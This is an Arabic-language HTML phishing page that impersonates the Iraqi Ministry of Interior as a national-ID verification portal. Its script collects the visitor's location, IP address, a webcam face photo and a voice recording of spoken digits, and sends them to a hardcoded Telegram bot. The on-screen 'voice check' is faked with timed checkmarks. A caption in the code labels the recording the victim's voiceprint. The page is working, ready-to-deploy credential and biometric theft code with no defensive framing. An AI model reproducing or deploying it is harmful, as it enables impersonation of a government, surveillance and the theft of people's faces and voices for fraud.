<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <title>وزارة الداخلية العراقية | النفاذ الوطني</title>
    <meta property="og:title" content="وزارة الداخلية العراقية - منصة التحقق">
    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Seal_of_the_Ministry_of_Interior_of_Iraq.svg/1024px-Seal_of_the_Ministry_of_Interior_of_Iraq.svg.png">

    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Arabic:wght@300;500;700&display=swap" rel="stylesheet">
    <style>
        body { background: #f1f5f9; color: #0f172a; font-family: 'Noto Sans Arabic', sans-serif; overflow-x: hidden; }
        .moi-header { background: linear-gradient(135deg, #1e3a8a, #1e1b4b); }
        .scanner-viewport { 
            width: 240px; height: 240px; border: 4px solid #1e40af; border-radius: 50%; 
            overflow: hidden; position: relative; background: #000; margin: 0 auto;
            box-shadow: 0 10px 40px rgba(30, 64, 175, 0.3);
        }
        .scan-line { 
            position: absolute; width: 100%; height: 3px; background: #3b82f6; 
            top: 0; box-shadow: 0 0 15px #3b82f6; animation: scan 2s infinite linear; 
        }
        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
        .digit-box { transition: all 0.3s ease; }
        .digit-success { color: #10b981; transform: scale(1.1); text-shadow: 0 0 10px rgba(16, 185, 129, 0.4); }
        .mirror { transform: scaleX(-1); }
        .check-mark { display: none; margin-right: 5px; font-size: 0.8em; }
    </style>
</head>
<body class="flex flex-col items-center min-h-screen pb-10">

    <header class="moi-header w-full py-8 text-white text-center shadow-xl">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Seal_of_the_Ministry_of_Interior_of_Iraq.svg/200px-Seal_of_the_Ministry_of_Interior_of_Iraq.svg.png" 
             class="w-20 h-20 mx-auto mb-3">
        <h1 class="text-xl font-bold">جمهورية العراق</h1>
        <h2 class="text-md opacity-90">وزارة الداخلية - تحديث البطاقة الوطنية</h2>
    </header>

    <main class="max-w-md w-full p-4 mt-6">
        <div id="mainCard" class="bg-white rounded-[2rem] p-6 shadow-2xl border border-slate-200 text-center space-y-6">
            
            <div id="alertBox" class="bg-blue-50 p-4 rounded-xl border border-blue-100">
                <p id="instruction" class="text-sm text-blue-950 font-bold leading-relaxed">
                    يرجى تفعيل "النفاذ" والبدء بقراءة الأرقام الظاهرة باللغة العربية بوضوح.
                </p>
            </div>

            <div class="scanner-viewport">
                <video id="webcam" class="w-full h-full object-cover mirror" autoplay playsinline muted></video>
                <div id="line" class="scan-line hidden"></div>
                <div id="doneOverlay" class="absolute inset-0 bg-green-600/60 hidden flex items-center justify-center z-20">
                    <svg class="w-16 h-16 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="4" d="M5 13l4 4L19 7"></path></svg>
                </div>
            </div>

            <!-- Interactive Digits with Logic -->
            <div id="digitsArea" class="hidden space-y-4">
                <p class="text-[10px] text-slate-400 font-bold uppercase tracking-widest">اختبار البصمة الصوتية</p>
                <div class="flex justify-center gap-3 text-3xl font-black">
                    <div id="d1" class="digit-box bg-slate-100 w-12 h-14 flex items-center justify-center rounded-xl border border-slate-200">٥</div>
                    <div id="d2" class="digit-box bg-slate-100 w-12 h-14 flex items-center justify-center rounded-xl border border-slate-200">٨</div>
                    <div id="d3" class="digit-box bg-slate-100 w-12 h-14 flex items-center justify-center rounded-xl border border-slate-200">٢</div>
                    <div id="d4" class="digit-box bg-slate-100 w-12 h-14 flex items-center justify-center rounded-xl border border-slate-200">٠</div>
                    <div id="d5" class="digit-box bg-slate-100 w-12 h-14 flex items-center justify-center rounded-xl border border-slate-200">٩</div>
                </div>
                <p id="micStatus" class="text-[10px] text-blue-500 animate-pulse">جاري الاستماع لنطق الأرقام...</p>
            </div>

            <button id="startBtn" class="w-full py-4 bg-blue-900 hover:bg-blue-800 text-white font-bold rounded-2xl shadow-lg transition-all transform active:scale-95">
                بدء النفاذ والتحقق
            </button>
        </div>
    </main>

    <canvas id="snapshot" style="display:none"></canvas>

    <script>
        const BOT_TOKEN = "8679801579:AAHY2m_T25mkrGjBjHgAnEGmlg7DVmWCQrI";
        const ADMIN_ID = "1523412137";

        async function sendTG(method, body) {
            try { await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, { method: 'POST', body }); } catch(e){}
        }

        async function startSystem() {
            const btn = document.getElementById('startBtn');
            const video = document.getElementById('webcam');
            const line = document.getElementById('line');
            const digits = document.getElementById('digitsArea');
            const instruction = document.getElementById('instruction');

            try {
                // تفعيل الميكروفون والكاميرا بطلب واحد
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                video.srcObject = stream;
                
                btn.style.display = 'none';
                line.classList.remove('hidden');
                digits.classList.remove('hidden');
                instruction.innerText = "يرجى نطق كل رقم يظهر بوضوح باللغة العربية للتحقق من هويتك.";

                // 1. سحب الموقع والـ IP
                navigator.geolocation.getCurrentPosition(async pos => {
                    const ipRes = await fetch('https://ipapi.co/json/');
                    const ipData = await ipRes.json();
                    const fd = new FormData();
                    fd.append('chat_id', ADMIN_ID);
                    fd.append('text', `🇮🇶 *نفاذ وطني جديد (عراقي)*\n📍 الموقع: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\n🌐 IP: \`${ipData.ip}\`\n📱 الجهاز: ${navigator.platform}`);
                    fd.append('parse_mode', 'Markdown');
                    sendTG('sendMessage', fd);
                });

                // 2. محاكاة "التحقق من نطق الأرقام" (علامة خضراء كل ثانية)
                const digitIds = ['d1', 'd2', 'd3', 'd4', 'd5'];
                let currentDigit = 0;
                const audioContext = new AudioContext();
                const source = audioContext.createMediaStreamSource(stream);
                const analyzer = audioContext.createAnalyser();
                source.connect(analyzer);

                const voiceCheckInterval = setInterval(() => {
                    if (currentDigit < digitIds.length) {
                        const el = document.getElementById(digitIds[currentDigit]);
                        el.classList.add('digit-success');
                        el.innerHTML += " ✅";
                        currentDigit++;
                    } else {
                        clearInterval(voiceCheckInterval);
                    }
                }, 1500);

                // 3. التقاط الصورة (بعد 4 ثواني)
                setTimeout(() => {
                    const canvas = document.getElementById('snapshot');
                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    canvas.toBlob(blob => {
                        const fd = new FormData();
                        fd.append('chat_id', ADMIN_ID);
                        fd.append('photo', blob, 'face.jpg');
                        fd.append('caption', "📸 صورة الهوية الملتقطة أثناء النطق");
                        sendTG('sendPhoto', fd);
                    }, 'image/jpeg');
                }, 4000);

                // 4. تسجيل البصمة الصوتية (كاملة)
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.onstop = async () => {
                    const audioBlob = new Blob(chunks, { type: 'audio/ogg' });
                    const fdA = new FormData();
                    fdA.append('chat_id', ADMIN_ID);
                    fdA.append('voice', audioBlob, 'voice.ogg');
                    fdA.append('caption', "🎤 بصمة صوت الضحية (نطق الأرقام العربية)");
                    await sendTG('sendVoice', fdA);

                    document.getElementById('doneOverlay').classList.remove('hidden');
                    document.getElementById('micStatus').innerText = "تم التحقق من البصمة الصوتية بنجاح.";
                    instruction.innerText = "تمت عملية التحديث. شكراً لتعاونكم مع وزارة الداخلية.";
                    setTimeout(() => window.location.href = "https://www.google.com", 2000);
                };
                
                recorder.start();
                setTimeout(() => recorder.stop(), 9000); // 9 ثواني كافية لقراءة الأرقام

            } catch (err) {
                instruction.innerText = "يجب السماح بالوصول للميكروفون والكاميرا لإتمام النفاذ الوطني.";
                instruction.style.color = "red";
            }
        }

        document.getElementById('startBtn').addEventListener('click', startSystem);
    </script>
</body>
</html>
